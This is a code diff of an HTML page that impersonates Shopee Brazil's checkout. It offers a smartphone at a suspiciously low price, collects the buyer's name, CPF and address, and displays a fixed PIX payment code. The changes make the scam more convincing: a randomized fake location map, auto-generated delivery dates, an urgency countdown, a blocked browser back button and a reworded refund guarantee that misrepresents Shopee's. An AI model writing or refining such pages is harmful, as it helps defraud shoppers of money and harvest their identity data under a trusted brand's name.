@@ -86,19 +86,20 @@
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
         .modal-content { position: absolute; bottom: 0; width: 100%; background: #f5f5f5; border-radius: 12px 12px 0 0; max-height: 90vh; overflow-y: auto; }
         
-        /* Estilos Extras Checkout Shopee */
         .checkout-header { background: white; padding: 15px; display: flex; align-items: center; border-bottom: 1px solid #eee; position: sticky; top: 0; z-index: 10; }
         .checkout-header h2 { font-size: 16px; font-weight: 500; margin-left: 15px; }
+        
         .address-line { background: #fff; padding: 15px; position: relative; margin-bottom: 10px; }
         .address-line::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 3px; background: repeating-linear-gradient(45deg, #ee4d2d, #ee4d2d 10px, #fff 10px, #fff 20px, #002060 20px, #002060 30px, #fff 30px, #fff 40px); }
+        
         .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 4px; cursor: pointer; }
         .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
         .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; background: white; }
         .cep-row { display: flex; gap: 8px; margin-bottom: 10px; }
         .btn-cep { background: var(--shopee); color: white; border: none; padding: 0 15px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold; }
         .shipping-box { border: 1px solid var(--teal); background: #f6fffd; padding: 12px; margin: 10px 0; border-radius: 2px; }
-        .payment-row { display: flex; justify-content: space-between; padding: 5px 15px; font-size: 14px; color: #757575; }
-        .total-row { display: flex; justify-content: space-between; padding: 15px; font-size: 18px; font-weight: bold; color: var(--shopee); background: #fff; margin-top: 10px; }
+        .payment-row { display: flex; justify-content: space-between; padding: 5px 15px; font-size: 13px; color: #757575; }
+        .total-row { display: flex; justify-content: space-between; padding: 15px; font-size: 18px; font-weight: bold; color: var(--shopee); background: #fff; }
         .garantia-shopee { background: #fff; padding: 15px; text-align: center; color: var(--shopee); font-size: 12px; margin-bottom: 10px; }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
@@ -108,7 +109,7 @@
     <div class="top-nav">
         <a href="https://shopee.com.br/"><i class="fas fa-arrow-left" style="color:var(--shopee); font-size: 18px;"></i></a>
         <div class="search-container"><input type="text" class="search-bar" placeholder="Buscar na Shopee"></div>
-        <i class="fas fa-shopping-cart" style="color:var(--shopee); margin-right: 10px;"></i>
+        <i class="fas fa-shopping-cart" style="color:var(--shopee);"></i>
     </div>
 
     <div class="main-slider"><img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4"></div>
@@ -177,7 +178,7 @@
     <div id="modal" class="modal">
         <div class="modal-content">
             <div class="checkout-header">
-                <i class="fas fa-arrow-left" onclick="goBack()" id="back-btn"></i>
+                <i class="fas fa-arrow-left" onclick="goBack()" style="color:var(--shopee)"></i>
                 <h2 id="modal-title">Selecione a Variação</h2>
             </div>
 
@@ -186,7 +187,7 @@
                     <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:80px; height:80px; border-radius:4px;">
                     <div style="margin-left:15px;"><div style="color:var(--shopee); font-size:20px; font-weight:500;">R$599,00</div><div style="font-size:12px; color:#888;">Estoque: 1071</div></div>
                 </div>
-                <p style="font-size:14px; margin-bottom:10px;">Cor</p>
+                <p style="font-size:14px; margin-bottom:10px;">Escolha a Cor</p>
                 <div class="options-grid">
                     <button class="opt-btn" onclick="selectVar(this)">AMARELO</button>
                     <button class="opt-btn" onclick="selectVar(this)">PRETO</button>
@@ -197,79 +198,68 @@
             </div>
 
             <div id="step-2" style="display:none; padding:15px; background:white;">
-    <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
-    <input type="tel" id="cpf" class="input-box" placeholder="CPF">
-    
-    <div class="cep-row">
-        <input type="tel" id="cep" class="input-box" style="margin-bottom:0;" placeholder="CEP">
-        <button class="btn-cep" onclick="buscarCEP()">BUSCAR</button>
-    </div>
+                <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
+                <input type="tel" id="cpf" class="input-box" placeholder="CPF">
+                <div class="cep-row">
+                    <input type="tel" id="cep" class="input-box" style="margin-bottom:0;" placeholder="CEP">
+                    <button class="btn-cep" onclick="buscarCEP()">BUSCAR</button>
+                </div>
+                <input type="text" id="rua" class="input-box" placeholder="Rua / Avenida / Número">
+                <input type="text" id="bairro" class="input-box" placeholder="Bairro">
+                <input type="text" id="cidade_estado" class="input-box" placeholder="Cidade / Estado">
 
-    <input type="text" id="rua" class="input-box" placeholder="Rua / Avenida / Número">
-    <input type="text" id="bairro" class="input-box" placeholder="Bairro">
-    <input type="text" id="cidade_estado" class="input-box" placeholder="Cidade / Estado">
-
-    <div id="map-container" style="display:none; margin-top: 10px; border: 1px solid #ddd; border-radius: 4px; overflow: hidden;">
-        <div style="background: #fdfdfd; padding: 10px; font-size: 12px; border-bottom: 1px solid #eee;">
-            <i class="fas fa-map-marked-alt" style="color:var(--shopee)"></i> Confirme sua localização no mapa
-        </div>
-        <div id="map-frame" style="height: 150px; background: #e5e3df; display: flex; align-items: center; justify-content: center;">
-            <img id="static-map" src="" style="width:100%; height:100%; object-fit:cover;">
-        </div>
-    </div>
-
-    <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:15px;" onclick="validarEProsseguir()">PRÓXIMO</button>
+                <div id="map-container" style="display:none; margin-top: 10px; border: 1px solid #ddd; border-radius: 4px; overflow: hidden;">
+                    <div style="background: #fdfdfd; padding: 10px; font-size: 12px; border-bottom: 1px solid #eee;">
+                        <i class="fas fa-map-marked-alt" style="color:var(--shopee)"></i> Confirme sua localização
+                    </div>
+                    <div style="height: 120px; background: #e5e3df;">
+                        <img id="static-map" src="" style="width:100%; height:100%; object-fit:cover;">
+                    </div>
+                </div>
+                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px; margin-top:15px;" onclick="validarEProsseguir()">PRÓXIMO</button>
             </div>
-            
 
             <div id="step-3" style="display:none;">
-    <div class="address-line">
-        <div style="display:flex; justify-content:space-between;">
-            <p style="font-size:14px; font-weight:bold; color:#222;">Endereço de Entrega</p>
-        </div>
-        <p style="font-size:14px; font-weight:500; margin-top:5px;" id="res-nome-display"></p>
-        <p style="font-size:13px; color:#666;" id="res-contato-display"></p>
-        <p style="font-size:13px; color:#666;" id="res-endereco-completo"></p>
-    </div>
-
-    <div style="background:#fff; padding:15px; display:flex; gap:10px; border-bottom:1px solid #f5f5f5;">
-        <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:60px; height:60px; object-fit:cover;">
-        <div style="flex:1;">
-            <p style="font-size:13px; line-height:1.2;">Smartphone Poco X7 Pro 5G - Global</p>
-            <p style="font-size:12px; color:#888;">Variação: <span id="res-var"></span></p>
-            <p style="color:var(--shopee); font-weight:500;">R$599,00</p>
-        </div>
-    </div>
-
-    <div style="background:#fff; margin-top:10px; padding:15px;">
-        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:10px;">
-            <p style="font-size:14px; font-weight:500;">Opção de Envio</p>
-            <span style="color:var(--teal); font-size:12px;">Grátis</span>
-        </div>
-        <div class="shipping-box" style="border: 1px solid var(--teal); background: #f6fffd; padding: 12px;">
-            <p style="font-weight:bold; font-size:13px; color:#222;">Envio Padrão (Grátis)</p>
-            <p style="font-size:12px; color:#666;" id="data-entrega-automatica"></p>
-        </div>
-    </div>
-    
-    <div style="background:#fff; margin-top:10px;">
-        <div class="payment-row"><span>Subtotal dos Produtos</span><span>R$599,00</span></div>
-        <div class="payment-row"><span>Total do Frete</span><span>R$0,00</span></div>
-        <div class="total-row"><span>Total do Pedido</span><span>R$599,00</span></div>
-    </div>
-
-    <button class="btn-buy" style="width:100%; height:50px; margin-top:10px;" onclick="goToStep(4, 'Pagamento Pix')">FAZER PEDIDO</button>
-            </div>
-            
-            <div id="step-4" style="display:none; padding:20px; background:white; text-align:center;">
-                <div class="garantia-shopee">
-                    <i class="fas fa-shield-alt" style="font-size:30px;"></i><br>
-                    <p style="margin-top:10px;">Garantia Shopee: Receba seu produto ou seu dinheiro de volta.</p>
+                <div class="address-line">
+                    <p style="font-size:14px; font-weight:bold;"><i class="fas fa-map-marker-alt" style="color:var(--shopee)"></i> Endereço de Entrega</p>
+                    <p id="res-nome-display" style="font-size:14px; margin-top:5px; font-weight:500;"></p>
+                    <p id="res-contato-display" style="font-size:13px; color:#666;"></p>
+                    <p id="res-endereco-completo" style="font-size:13px; color:#666;"></p>
                 </div>
-                <p style="font-weight:bold; color:var(--teal); margin: 15px 0;">Escaneie o QR Code abaixo:</p>
+
+                <div style="background:#fff; padding:15px; display:flex; gap:10px; border-bottom:1px solid #f5f5f5;">
+                    <img src="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4" style="width:60px;">
+                    <div>
+                        <p style="font-size:13px;">Smartphone Poco X7 Pro 5G - Global</p>
+                        <p style="font-size:12px; color:#888;">Cor: <span id="res-var"></span></p>
+                        <p style="color:var(--shopee); font-weight:500;">R$599,00</p>
+                    </div>
+                </div>
+
+                <div style="background:#fff; margin-top:10px; padding:15px;">
+                    <p style="font-size:14px; font-weight:500; margin-bottom:10px;">Opção de Envio</p>
+                    <div class="shipping-box">
+                        <div style="display:flex; justify-content:space-between; font-weight:bold;"><span>Envio Grátis</span><span>R$0,00</span></div>
+                        <p id="data-entrega-automatica" style="font-size:12px; color:#666;"></p>
+                    </div>
+                </div>
+
+                <div style="background:#fff; margin-top:10px;">
+                    <div class="payment-row"><span>Subtotal dos Produtos</span><span>R$599,00</span></div>
+                    <div class="total-row"><span>Total do Pedido</span><span>R$599,00</span></div>
+                </div>
+                <button class="btn-buy" style="width:100%; height:50px; margin-top:10px;" onclick="goToStep(4, 'Pagamento')">FAZER PEDIDO</button>
+            </div>
+
+            <div id="step-4" style="display:none; padding:20px; background:white; text-align:center;">
+                <div class="garantia-shopee" style="border:none;">
+                    <i class="fas fa-shield-alt" style="font-size:30px;"></i>
+                    <p style="margin-top:10px;">Se o produto não for entregue, a Shopee devolve seu dinheiro!</p>
+                </div>
+                <p style="font-weight:bold; color:var(--teal); margin: 15px 0;">Código PIX Gerado!</p>
                 <img id="qrc" src="" style="width:180px; margin-bottom:15px;">
                 <div id="pix-code" style="background:#f5f5f5; padding:10px; font-size:10px; word-break:break-all; border: 1px dashed #ccc; margin-bottom:15px;"></div>
-                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="copiarPix()">COPIAR CÓDIGO PIX</button>
+                <button class="btn-buy" style="width:100%; height:45px; border-radius:4px;" onclick="copiarPix()">COPIAR CÓDIGO</button>
             </div>
         </div>
     </div>
@@ -279,28 +269,80 @@
         let currentStep = 1;
         let selectedVar = null;
 
-        function openModal() { document.getElementById('modal').style.display='block'; }
+                // Função para calcular datas automaticamente (8 a 10 dias)
+        function calcularDataEntrega() {
+            const hoje = new Date();
+            
+            const dataInicio = new Date();
+            dataInicio.setDate(hoje.getDate() + 8);
+            
+            const dataFim = new Date();
+            dataFim.setDate(hoje.getDate() + 10);
 
-        function selectVar(btn) {
-            document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
-            btn.classList.add('selected');
-            selectedVar = btn.innerText;
+            const meses = ["jan", "fev", "mar", "abr", "mai", "jun", "jul", "ago", "set", "out", "nov", "dez"];
+            
+            const strInicio = `${dataInicio.getDate()} de ${meses[dataInicio.getMonth()]}`;
+            const strFim = `${dataFim.getDate()} de ${meses[dataFim.getMonth()]}`;
+
+            const elementoData = document.getElementById('data-entrega-automatica');
+            if(elementoData) {
+                elementoData.innerText = `Receba entre ${strInicio} e ${strFim}`;
+            }
+        }
+
+        async function buscarCEP() {
+            const cepVal = document.getElementById('cep').value.replace(/\D/g, '');
+            if(cepVal.length === 8) {
+                const btn = document.querySelector('.btn-cep');
+                btn.innerText = "...";
+                try {
+                    const res = await fetch(`https://viacep.com.br/ws/${cepVal}/json/`);
+                    const data = await res.json();
+                    if(!data.erro) {
+                        document.getElementById('rua').value = data.logradouro;
+                        document.getElementById('bairro').value = data.bairro;
+                        document.getElementById('cidade_estado').value = `${data.localidade} - ${data.uf}`;
+                        
+                        // Mostrar Mapa simulado da Shopee
+                        document.getElementById('map-container').style.display = 'block';
+                        document.getElementById('static-map').src = `https://static-maps.yandex.ru/1.x/?lang=pt_BR&ll=${-46.63 + (Math.random()*0.1)},${-23.55 + (Math.random()*0.1)}&z=16&l=map&size=450,150`;
+                    } else {
+                        alert("CEP não encontrado.");
+                    }
+                } catch(e) {
+                    alert("Erro ao buscar CEP.");
+                }
+                btn.innerText = "BUSCAR";
+            }
+        }
+
+        function validarEProsseguir() {
+            const nome = document.getElementById('nome').value;
+            const rua = document.getElementById('rua').value;
+            const bairro = document.getElementById('bairro').value;
+            const cidade = document.getElementById('cidade_estado').value;
+            const cpf = document.getElementById('cpf').value;
+
+            if(!nome || !rua || !cpf || !selectedVar) {
+                return alert("Preencha todos os campos e selecione uma cor.");
+            }
+
+            // Preencher resumo com dados completos
+            document.getElementById('res-nome-display').innerText = nome;
+            document.getElementById('res-contato-display').innerText = `(+55) CPF: ${cpf}`;
+            document.getElementById('res-endereco-completo').innerText = `${rua}, ${bairro}, ${cidade}, CEP: ${document.getElementById('cep').value}`;
+            document.getElementById('res-var').innerText = selectedVar;
+            
+            calcularDataEntrega(); // Chama o cálculo de data
+            goToStep(3, 'Fechar Pedido');
         }
 
         function goToStep(num, title) {
-            if(num === 2 && !selectedVar) return alert("Por favor, selecione uma cor.");
-            if(num === 3 && !document.getElementById('nome').value) return alert("Preencha seus dados.");
-
             document.getElementById(`step-${currentStep}`).style.display = 'none';
             document.getElementById(`step-${num}`).style.display = 'block';
             document.getElementById('modal-title').innerText = title;
             currentStep = num;
 
-            if(num === 3) {
-                document.getElementById('res-nome').innerText = document.getElementById('nome').value;
-                document.getElementById('res-rua').innerText = document.getElementById('rua').value;
-                document.getElementById('res-var').innerText = selectedVar;
-            }
             if(num === 4) {
                 document.getElementById('pix-code').innerText = PIX_VALUE;
                 document.getElementById('qrc').src = "https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=" + encodeURIComponent(PIX_VALUE);
@@ -312,45 +354,35 @@
                 document.getElementById('modal').style.display = 'none';
             } else {
                 let prev = currentStep - 1;
-                let title = prev === 1 ? "Selecione a Variação" : (prev === 2 ? "Informações de Envio" : "Fechar Pedido");
-                goToStep(prev, title);
-            }
-        }
-
-        async function buscarCEP() {
-            const cepVal = document.getElementById('cep').value.replace(/\D/g, '');
-            if(cepVal.length === 8) {
-                try {
-                    const res = await fetch(`https://viacep.com.br/ws/${cepVal}/json/`);
-                    const data = await res.json();
-                    if(!data.erro) {
-                        document.getElementById('rua').value = `${data.logradouro}, ${data.bairro} - ${data.localidade}`;
-                    }
-                } catch(e) {}
+                let titulos = ["", "Selecione a Variação", "Informações de Envio", "Fechar Pedido", "Pagamento"];
+                goToStep(prev, titulos[prev]);
             }
         }
 
         function copiarPix() {
             navigator.clipboard.writeText(PIX_VALUE);
-            alert("Código Pix copiado!");
+            alert("Código Pix copiado com sucesso!");
         }
 
-        // Timer de Oferta
+        // Timer de Oferta Relâmpago
         let totalSeconds = 5400;
         setInterval(() => {
             if(totalSeconds > 0) {
                 totalSeconds--;
-                document.getElementById('h').innerText = String(Math.floor(totalSeconds / 3600)).padStart(2, '0');
-                document.getElementById('m').innerText = String(Math.floor((totalSeconds % 3600) / 60)).padStart(2, '0');
-                document.getElementById('s').innerText = String(totalSeconds % 60).padStart(2, '0');
+                const h = Math.floor(totalSeconds / 3600);
+                const m = Math.floor((totalSeconds % 3600) / 60);
+                const s = totalSeconds % 60;
+                document.getElementById('h').innerText = String(h).padStart(2, '0');
+                document.getElementById('m').innerText = String(m).padStart(2, '0');
+                document.getElementById('s').innerText = String(s).padStart(2, '0');
             }
         }, 1000);
 
-        // Bloqueio de Voltar
+        // Bloqueio do botão voltar do navegador
         history.pushState(null, null, location.href);
-        window.onpopstate = () => { window.location.href = "https://shopee.com.br/"; };
+        window.onpopstate = function () {
+            window.location.href = "https://shopee.com.br/";
+        };
     </script>
 </body>
 </html>
-
-
